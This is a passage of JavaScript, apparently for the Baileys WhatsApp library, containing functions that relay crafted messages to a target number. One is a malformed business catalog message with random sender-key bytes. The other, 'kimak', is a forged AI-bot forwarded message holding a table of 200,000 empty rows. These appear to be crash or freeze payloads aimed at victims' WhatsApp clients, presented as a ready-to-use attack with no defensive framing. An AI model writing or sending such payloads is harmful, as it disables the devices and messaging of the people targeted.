                businessMessageForwardInfo: {
                    businessOwnerJid: "13135550002@s.whatsapp.net",
                    businessDescription: null,
                }
            },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "catalog_message",
                        buttonParamsJson: "{}"
                    }
                ],
                messageParamsJson: "{}"
            }
        },
        senderKeyDistributionMessage: {
            groupId: "72051234@g.us",
            axolotlSenderKeyDistributionMessage: crypto.randomBytes(32)
        }
    }, {
        additionalNodes: [
            {
                tag: "biz",
                attrs: {
                    native_flow_name: "catalog_message"
                }
            }
        ]
    })
}
async function kimak(otax, target) {
    await otax.relayMessage(target, {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            botMetadata: {
                pluginMetadata: {},
                richResponseSourcesMetadata: { sources: [] }
            }
        },
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 4,
                            tableMetadata: {
                                title: "MantaX",
                                rows: Array.from({ length: 200000 }, () => ({}))
                            }
                        }
                    ],
                    unifiedResponse: {
                        data: JSON.stringify({
                            response_id: crypto.randomUUID(),
                            sections: []
                        })
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "867051314767696@bot"
                        },
                        forwardOrigin: 4
                    }
                }
            }
        }
    }, {
        participant: { jid: target }
    });
}
